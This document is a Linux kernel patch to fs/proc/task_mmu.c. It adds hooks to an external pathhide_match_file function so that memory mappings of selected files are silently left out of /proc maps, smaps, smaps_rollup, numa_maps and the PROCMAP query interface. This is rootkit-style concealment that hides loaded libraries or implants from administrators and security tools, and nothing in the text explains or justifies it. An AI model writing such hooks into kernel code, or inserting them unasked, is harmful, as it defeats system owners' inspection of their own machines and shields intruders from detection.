@@ -1,0 +1,73 @@
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -516,6 +516,10 @@ show_map_vma(struct seq_file *m, struct
+ static int show_map(struct seq_file *m, void *v)
+ {
+ 	struct vm_area_struct *vma = v;
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
+ 
+ 	if (vma_data_pages(vma))
+ 		show_map_vma(m, vma);
+@@ -569,12 +573,16 @@ static struct vm_area_struct *query_matc
+ 						 unsigned long addr, u32 flags)
+ {
+ 	struct vm_area_struct *vma;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ next_vma:
+ 	vma = query_vma_find_by_addr(mm, addr);
+ 	if (!vma)
+ 		goto no_vma;
+ 
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		goto skip_vma;
++
+ 	/* user requested only file-backed VMA, keep iterating */
+ 	if ((flags & PROCMAP_QUERY_FILE_BACKED_VMA) && !vma->vm_file)
+ 		goto skip_vma;
+@@ -1328,6 +1336,10 @@ static int show_smap(struct seq_file *m,
+ {
+ 	struct vm_area_struct *vma = v;
+ 	struct mem_size_stats mss = {};
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
+ 
+ 	if (!vma_data_pages(vma))
+ 		goto show_pad;
+@@ -1367,6 +1379,7 @@ static int show_smaps_rollup(struct seq_
+ 	int ret = 0;
+ 	int nr_contended = 0;
+ 	VMA_ITERATOR(vmi, mm, 0);
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	priv->task = get_proc_task(priv->inode);
+ 	if (!priv->task)
+@@ -1389,6 +1402,8 @@ static int show_smaps_rollup(struct seq_
+ 
+ 	vma_start = vma->vm_start;
+ 	do {
++		if (vma->vm_file && pathhide_match_file(vma->vm_file))
++			continue;
+ 		smap_gather_stats(vma, &mss, 0);
+ 		last_vma_end = vma->vm_end;
+ 
+@@ -3303,10 +3318,14 @@ static int show_numa_map(struct seq_file
+ 	struct mempolicy *pol;
+ 	pgoff_t ilx;
+ 	int nid;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	if (!mm)
+ 		return 0;
+ 
++	if (file && pathhide_match_file(file))
++		return 0;
++
+ 	/* Ensure we start with an empty set of numa_maps statistics. */
+ 	memset(md, 0, sizeof(*md));
+ 
